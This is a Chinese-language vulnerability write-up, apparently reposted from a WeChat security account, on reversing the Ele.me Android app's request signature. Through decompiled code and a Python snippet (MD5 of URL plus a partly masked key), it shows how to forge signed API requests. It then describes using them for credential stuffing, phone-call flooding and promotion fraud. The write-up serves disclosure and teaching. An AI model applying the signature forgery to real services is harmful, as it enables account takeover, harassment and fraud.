@@ -1,0 +1,147 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>由饿了么密码学误用致绕过防御浅谈android密码学漏洞</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>由饿了么密码学误用致绕过防御浅谈android密码学漏洞</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzAwMDQwNTE5MA==&amp;mid=209773402&amp;idx=1&amp;sn=53f8e5adc7ff3f5744eab97dafc38baf&amp;chksm=139d38f324eab1e57d3344973735bfad3faee719b4a6246b9036516aa25095f023caa65558f8&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzAwMDQwNTE5MA==&amp;mid=209773402&amp;idx=1&amp;sn=53f8e5adc7ff3f5744eab97dafc38baf&amp;chksm=139d38f324eab1e57d3344973735bfad3faee719b4a6246b9036516aa25095f023caa65558f8&amp;scene=27#wechat_redirect</a></blockquote><p style="">密码学误用在app中是个很大的问题，几乎所有apk的校验算法都能被模拟<br/>饿了么的算法鲁棒性和隐蔽性算是不错的，提出来讲是为了证明签名校验机制的脆弱<br/>虽然提交给饿了么，但是说的是一大类问题<br/>瘦蛟舞大牛就提出过这个问题 http://drops.wooyun.org/tips/6049<br/>很多应用采用的加密算法更是不堪 抛砖引玉，希望大家把这个也当做一个新的方向去挖掘发现漏洞</p><p style="">饿了么客户端先前在wooyun上被人挖出各种洞， 撞库，电话资源争夺等 后来加入签名验证算法，统一防护，防止被人篡改提交的数据。 那么如果算法能被破解呢？</p><p style="">我们用burp抓包发现<br/><span/></p><pre spellcheck="false" style="">GET /user/messages/unread_count?auth_key=anonymous&amp;consumer_key=9609106914&amp;eleme_device_id=b0227139-2450-3ef3-a6fb-a6f96bdf50f1&amp;geohash=wtw36sc63f9z&amp;geohash_id=wtw36sc63f9z&amp;session_id=824af5f3238f919760b0eb199d3720dd&amp;timestamp=1438222642&amp;track_id=1437405188%7C_d3fe5148-2ef1-11e5-8ec6-c81f66fb8809%7Cfe894109028504a5754b00077b361aa6&amp;user_id=886&amp;sig=640dfedbaaa466455aefdd33825b7ecf HTTP/1.1
+X-DeviceInfo: aW1laTowMDAwMDAwMDAwMDAwMDAgc2VyaWFsOnVua25vd24gYW5kcm9pZF9pZDpmNmNkNzAyNDBlMmM1ZTY0IGJyYW5kOmdlbmVyaWMgbW9kZWw6Q3VzdG9tX1Bob25lXy1fNC4yLjJfLV9BUElfMTdfLV83Njh4MTI4MCBuZXR3b3JrT3BlcmF0b3I6MzEwMjYwIG1hY0FkZHJlc3M6MDhfMDBfMjdfY2VfZGNfYjEgbmV0VHlwZTpXSUZJIHNpbVNlcmlhbE51bWJlcjo4OTAxNDEwMzIxMTExODUxMDcyMCBzaW1TdGF0ZTo1IHdpZmlMaXN0OjAxXzgwX2MyXzAwXzAwXzAzIGhhdmVCbHVldG9vdGg6dHJ1ZSBoYXJkd2FyZV9pZDo3MTgyMGNjZjI4ZWFiYjkxYTA2MmUzMWFmYzFmMTE3YyBmaXJzdF9vcGVuOjE0Mzc2NjkxOTMgbGFzdF9vcGVuOjE0MzgyMjI2MzYgbmV0X3R5cGU6d2lmaSBlbmVyZ3lfcGVyY2VudDo5MyB0cmFja19pZDogbWVtb3J5OjMwNg==
+Accept-Encoding: gzip
+Host: api.ele.me
+Connection: Keep-Alive
+User-Agent: Rajax/1 Custom_Phone_-_4.2.2_-_API_17_-_768x1280/vbox86p Android/4.2.2 Display/vbox86p-userdebug_4.2.2_JDQ39E_eng.buildbot.20150609.211601_test-keys Eleme/5.1.1 ID/b0227139-2450-3ef3-a6fb-a6f96bdf50f1; KERNEL_VERSION:3.4.67-qemu+ API_Level:17</pre><p style="">饿了么每一个客户端的数据包都会附加一个签名sig<br/>如果你篡改POST或者GET过去的任意一个参数<br/>都会返回一个</p><pre spellcheck="false" style="">HTTP/1.1 200 OK
+Server: Tengine/2.1.0
+Date: Thu, 30 Jul 2015 05:09:50 GMT
+Content-Type: application/json; charset=UTF-8
+Connection: keep-alive
+Vary: Accept-Encoding
+Content-Length: 136
+
+{"response": [{"message": "\u672a\u77e5\u9519\u8bef\uff0c\u8bf7\u7a0d\u540e\u91cd\u8bd5", "pre": "client_error/auth/signature_error"}]}</pre><p style="">猜测他的机制应该是数据本地加上签名校验<br/>然后发送到server端用相同的算法进行签名验证 如果传过去的sig不等于数据在server端加密后的期望值，返回一个签名错误。</p><p style="">所以我们现在想破解用户数据（ http://www.wooyun.org/bugs/wooyun-2010-0115990）<br/>也不能狂打人家电话了（http://www.wooyun.org/bugs/wooyun-2015-0106656）<br/>更不能免费吃喝(http://www.wooyun.org/bugs/wooyun-2015-0125060)</p><p style="">那么这个算法是否具有弱点呢？<br/>我们打开jeb逆向看看<br/>搜索sig” 很快定位到关键点<br/><img data-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiaTNf3tDPNmjbOILxicEq08aeg9UK3EMHJ0qVpL2icOXm60Cgn8IJN5tZw/0?wx_fmt=jpeg" style="border: 0px; vertical-align: middle; border-radius: 3px; width: auto !important; min-height: 40px !important;" class="" data-type="jpeg" data-ratio="0.6620553359683794" data-w="" src="../Images/1204ed4b9248308d89074abee1a5a137.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiaTNf3tDPNmjbOILxicEq08aeg9UK3EMHJ0qVpL2icOXm60Cgn8IJN5tZw/0?wx_fmt=jpeg"/><br/>跟入<br/><img data-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiaS9y3XBtfb9spXoDESl3452mR2uSkzOzQJ8iaujCuaOQYE5ibhnOOK7lw/0?wx_fmt=jpeg" style="border: 0px; vertical-align: middle; border-radius: 3px; width: auto !important; min-height: 40px !important;" class="" data-type="jpeg" data-ratio="0.4367588932806324" data-w="" src="../Images/c6cd83bb68d0ac1c2b6e9544c192560c.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiaS9y3XBtfb9spXoDESl3452mR2uSkzOzQJ8iaujCuaOQYE5ibhnOOK7lw/0?wx_fmt=jpeg"/><br/>发现sig字段是由s.a处理的<br/>继续跟过去</p><pre spellcheck="false" style="">public class s {
+    static {
+        System.loadLibrary("signer");
+    }
+
+    private s() {
+        super();
+    }
+
+    public static String a(String arg8, Context arg9) {
+        String v0_2;
+        Class v1 = s.class;
+        __monitor_enter(v1);
+        try {
+            long v2 = System.currentTimeMillis();
+            try {
+                v0_2 = s.sign(arg8, arg9);
+                a.a("signer sign time consuming is " + (System.currentTimeMillis() - v2) + "ms");
+            }
+            catch(Exception v0_1) {
+                try {
+                    a.b("sign error");
+                    v0_1.printStackTrace();
+                    v0_2 = "";
+                }
+                catch(Throwable v0) {
+                label_23:
+                    __monitor_exit(v1);
+                    throw v0;
+                }
+            }
+        }
+        catch(Throwable v0) {
+            goto label_23;
+        }
+
+        __monitor_exit(v1);
+        return v0_2;
+    }
+
+    private static native String sign(s this, String arg1, Context arg2) {
+    }
+}</pre><p style="">可以看到这里它load System.loadLibrary(“signer”);<br/>也就是使用了.so文件报装他的算法<br/>private static native String sign(s this, String arg1, Context arg2) {<br/>}<br/>然后传入签名</p><p style="">我们解包看看这个so库<br/>apktool d -d eleme.apk</p><p style="">在/lib/armeabi下找到那个库<br/>libsigner.so</p><p style="">IDA Pro分析下 发现是可以反汇编的<br/><img data-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiadIbtg0cpxcswrFGEYhRQvsbq1NbfcK2ibZC6fvrFeFVJkGRLywFeZEA/0?wx_fmt=jpeg" style="border: 0px; vertical-align: middle; border-radius: 3px; width: auto !important; min-height: 40px !important;" class="" data-type="jpeg" data-ratio="0.6561264822134387" data-w="" src="../Images/a42a0692a1841d0c50cc0aa44fd2aa2f.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiadIbtg0cpxcswrFGEYhRQvsbq1NbfcK2ibZC6fvrFeFVJkGRLywFeZEA/0?wx_fmt=jpeg"/></p><p style="">图中我们可以看到depre2String 跟踪过去</p><pre spellcheck="false" style="">int __fastcall depre2String(int a1)
+{
+  int v1; // r4@1
+  int result; // r0@1
+
+  v1 = a1;
+  result = depre();
+  if ( result )
+    result = toString(v1, result);
+  return result;
+}</pre><p style="">所以depre是主要流程 //其实这里挺奇怪的，按理说签名算法应该是enpre，为何这里是depre</p><p style="">肯定有鬼，我们跟踪过去看看</p><pre spellcheck="false" style="">int __fastcall depre(_JNIEnv *a1, int a2)
+{
+  _JNIEnv *v2; // r4@1
+  int v3; // r0@1
+  int v4; // r5@1
+  int v5; // r0@1
+  int v6; // r7@1
+  int v7; // r0@1
+  int v8; // r5@1
+  int v9; // r6@1
+  int v10; // r0@2
+  int v11; // r6@2
+  int v12; // r0@3
+  int v13; // r7@4
+  int v14; // r7@5
+  int v15; // r5@5
+  int v16; // r0@5
+  int v17; // r3@5
+  int v19; // [sp+8h] [bp-28h]@3
+  int v20; // [sp+Ch] [bp-24h]@1
+  int v21; // [sp+10h] [bp-20h]@1
+  int v22; // [sp+14h] [bp-1Ch]@3
+
+  v20 = a2;
+  v2 = a1;
+  v3 = _JNIEnv::FindClass(a1, "android/util/Base64");
+  v4 = v3;
+  v5 = _JNIEnv::GetStaticFieldID(v2, v3, "NO_WRAP", "I");
+  _JNIEnv::GetStaticIntField(v2, v4, v5);
+  v6 = _JNIEnv::GetStaticMethodID(v2, v4, "depre", "([BI)[B");
+  v7 = toBytes(
+         v2,
+         "wialR9SXLS/cI/tJ7grD93HbcpfISNRucCQIKd6InJyQXD3gL90a65cDIQWMEMIBMh5FCzTNgeqGE34puzDe8169tz3gX/HRKKT1uMXNWPonoPLLaYH9iiiq4Pq5wMxNig1WslNPDNJPDrWcHIQ55uQpTwerd1zDiiksGpwL380=");
+  v21 = _JNIEnv::CallStaticObjectMethod(v2, v4, v6, v7);
+  _JNIEnv::DeleteLocalRef(v2, v4);
+  v8 = _JNIEnv::FindClass(v2, "javax/crypto/Cipher");
+  v9 = _JNIEnv::GetStaticMethodID(v2, v8, "getInstance", "(Ljava/lang/String;)Ljavax/crypto/Cipher;");
+  if ( !dword_5004 )
+  {
+    v10 = _JNIEnv::NewStringUTF(v2, "RSA/ECB/PKCS1Padding");
+    v11 = _JNIEnv::CallStaticObjectMethod(v2, v8, v9, v10);
+    dword_5004 = _JNIEnv::NewGlobalRef(v2, v11);
+    _JNIEnv::DeleteLocalRef(v2, v11);
+  }
+  v12 = _JNIEnv::GetStaticFieldID(v2, v8, "DECRYPT_MODE", "I");
+  v19 = _JNIEnv::GetStaticIntField(v2, v8, v12);
+  v22 = _JNIEnv::GetMethodID(v2, v8, "init", "(ILjava/security/Key;)V");
+  if ( !dword_5008 )
+  {
+    v13 = getPublicKey(v2, v20);
+    dword_5008 = _JNIEnv::NewGlobalRef(v2, v13);
+    _JNIEnv::DeleteLocalRef(v2, v13);
+  }
+  _JNIEnv::CallVoidMethod(v2, dword_5004, v22, v19);
+  v14 = _JNIEnv::GetMethodID(v2, v8, "doFinal", "([B)[B");
+  _JNIEnv::DeleteLocalRef(v2, v8);
+  v15 = _JNIEnv::CallObjectMethod(v2, dword_5004, v14, v21);
+  v16 = throwException(v2);
+  v17 = 0;
+  if ( !v16 )
+  {
+    _JNIEnv::DeleteLocalRef(v2, v21);
+    v17 = v15;
+  }
+  return v17;
+}</pre><p style="">首先可以看出的是作者煞费苦心地利用java反射机制 调用JNI使用了一系列java原有的方法进行混淆<br/>然后问题在这</p><pre spellcheck="false" style="">"wialR9SXLS/cI/tJ7grD93HbcpfISNRucCQIKd6InJyQXD3gL90a65cDIQWMEMIBMh5FCzTNgeqGE34puzDe8169tz3gX/HRKKT1uMXNWPonoPLLaYH9iiiq4Pq5wMxNig1WslNPDNJPDrWcHIQ55uQpTwerd1zDiiksGpwL380="</pre><p style="">这段数据是硬编码到so文件里面的，然后它调用各种JNI方法的作用无非就是想混淆，增加破解难度<br/>不过这个算法由于密码学误用，依然的是可以破解的<br/>逆向之后我得到了一个key<br/>其中key就是调用一大堆冗杂的jni生成的一段hash<br/>有了key 我们就能用来加密，构造服务器所信任的恶意请求<br/>那到底是怎样加密我们的请求的呢<br/>我们先用某神器插桩监控下这个调用<br/><img data-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiadYGpJFNpKz7ejQbXfRORDzYz9zw8PE5neB8DadHI6vcOBqlnVzWNsA/0?wx_fmt=jpeg" style="border: 0px; vertical-align: middle; border-radius: 3px; width: auto !important; min-height: 40px !important;" class="" data-type="jpeg" data-ratio="0.3142292490118577" data-w="" src="../Images/a61cd6a073e1d8a962d2e29cb3062697.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiadYGpJFNpKz7ejQbXfRORDzYz9zw8PE5neB8DadHI6vcOBqlnVzWNsA/0?wx_fmt=jpeg"/></p><p style="">可以看到其实就是<br/>MD5（getUrl+key）</p><pre spellcheck="false" style="">	encrypturl = "https://api.ele.me/1/user/login?auth_key=anonymous&amp;consumer_key=9609106914&amp;eleme_device_id=b0227139-2450-3ef3-a6fb-a6f96bdf50f1&amp;password="+password+"&amp;session_id=824af5f3238f919760b0eb199d3720dd&amp;timestamp=1438144822&amp;track_id=1437405188|_d3fe5148-2ef1-11e5-8ec6-c81f66fb8809|fe894109028504a5754b00077b361aa6&amp;user_id=886&amp;username="+username
+	key        = "b775d5b4（我是马赛克）95b0b2119294ccf9"
+	sig 	   = hashlib.md5(encrypturl+key).hexdigest()</pre><p style="">可以看到我们构造任意链接都不再抛出签名错误<br/><img data-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiaRWHnlKOeOeO4GETxBOWQfBu0ic9FISfwwQ9CSJjHEdvzWddzrtGicugg/0?wx_fmt=jpeg" style="border: 0px; vertical-align: middle; border-radius: 3px; width: auto !important; min-height: 40px !important;" class="" data-type="jpeg" data-ratio="0.4683794466403162" data-w="" src="../Images/8e7745f3c610ef268d3099856f33a3de.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiaRWHnlKOeOeO4GETxBOWQfBu0ic9FISfwwQ9CSJjHEdvzWddzrtGicugg/0?wx_fmt=jpeg"/></p><p style="">看看发动电话攻击<br/><img data-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiapibD0vf5hMKIyoGZesOgno2AdPxFgibia1PQwcWHJj6pjO0b3KjJqIiawg/0?wx_fmt=jpeg" style="border: 0px; vertical-align: middle; border-radius: 3px; width: auto !important; min-height: 40px !important;" class="" data-type="jpeg" data-ratio="0.17193675889328064" data-w="" src="../Images/ae3205a79e9fbc01d4c6c5b0e4ebe846.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiapibD0vf5hMKIyoGZesOgno2AdPxFgibia1PQwcWHJj6pjO0b3KjJqIiawg/0?wx_fmt=jpeg"/><br/>可以看到在拨打电话之前是有验证注册与否的<br/>但是我们现在可以伪造号码，加上后端没有拨打限制次数<br/>所以我们可以直接伪造了<br/><img data-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiaJPj4YkwqdWTs0EvoyPtDaENTNjMXfnFRElD3f8vfV9qm8fJoASXKIw/0?wx_fmt=png" style="border: 0px; vertical-align: middle; border-radius: 3px; width: auto !important; min-height: 40px !important;" class="" data-type="png" data-ratio="1.774703557312253" data-w="" src="../Images/236825f5a3556cbc3e96b5d11542eafc.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibiaJPj4YkwqdWTs0EvoyPtDaENTNjMXfnFRElD3f8vfV9qm8fJoASXKIw/0?wx_fmt=png"/></p><p style="">这时候我们终于可以撞库:<br/><img data-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibialiaF5mq9tJiapqYMQ4GQGCWMSBAReSFru8urlLmlPibcPWwic3DPDodmPw/0?wx_fmt=jpeg" style="border: 0px; vertical-align: middle; border-radius: 3px; width: auto !important; min-height: 40px !important;" class="" data-type="jpeg" data-ratio="0.549407114624506" data-w="" src="../Images/2b0a70222298e2f3fdb181e86e81a95f.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicL8f7Xjtsl1jjaayxNgXpvibialiaF5mq9tJiapqYMQ4GQGCWMSBAReSFru8urlLmlPibcPWwic3DPDodmPw/0?wx_fmt=jpeg"/></p><p style="">至于免费领取早餐午餐晚餐活动，<br/>相信只要活动出现，自然可以篡改数据完成</p><p><span style="margin: 0px; padding: 0px; max-width: 100%; color: rgb(62, 62, 62); white-space: pre-wrap; font-family: Calibri, sans-serif; font-size: 14px; line-height: 22.3999996185303px; box-sizing: border-box !important; word-wrap: break-word !important; background-color: rgb(255, 255, 255);">                </span><img data-w="344" data-ratio="1" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicLibuwuXibLib1t5AJl0JseltnibPdB2h8M0IYAXtjZzp9BjYGr7kjPj0elNGdODSwQjaiboA8kya5hib8HQ/0" width="auto" style="margin: 0px; padding: 0px; color: rgb(62, 62, 62); white-space: pre-wrap; font-family: Calibri, sans-serif; font-size: 14px; line-height: 22.3999996185303px; box-sizing: border-box !important; word-wrap: break-word !important; width: auto !important; visibility: visible !important; background-color: rgb(255, 255, 255);" src="../Images/31df5f36d24908c6c85f5b32cd8a1d3b.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/2dMzopbOicLibuwuXibLib1t5AJl0JseltnibPdB2h8M0IYAXtjZzp9BjYGr7kjPj0elNGdODSwQjaiboA8kya5hib8HQ/0"/><br style="margin: 0px; padding: 0px; max-width: 100%; color: rgb(62, 62, 62); white-space: pre-wrap; font-family: Calibri, sans-serif; font-size: 14px; line-height: 22.3999996185303px; box-sizing: border-box !important; word-wrap: break-word !important; background-color: rgb(255, 255, 255);"/><span style="margin: 0px; padding: 0px; max-width: 100%; color: rgb(62, 62, 62); white-space: pre-wrap; font-family: Calibri, sans-serif; font-size: 14px; line-height: 22.3999996185303px; box-sizing: border-box !important; word-wrap: break-word !important; background-color: rgb(255, 255, 255);">          </span><strong style="margin: 0px; padding: 0px; max-width: 100%; color: rgb(62, 62, 62); white-space: pre-wrap; font-family: Calibri, sans-serif; font-size: 14px; line-height: 22.3999996185303px; box-sizing: border-box !important; word-wrap: break-word !important; background-color: rgb(255, 255, 255);">   </strong><span style="margin: 0px; padding: 0px; max-width: 100%; color: rgb(62, 62, 62); white-space: pre-wrap; font-family: Calibri, sans-serif; font-size: 18px; box-sizing: border-box !important; word-wrap: break-word !important; background-color: rgb(255, 255, 255);"><strong style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;">  扫 “白帽子” 二维码 ，关注最新安全资讯！</strong></span></p>
+        
+</body>
+</html>
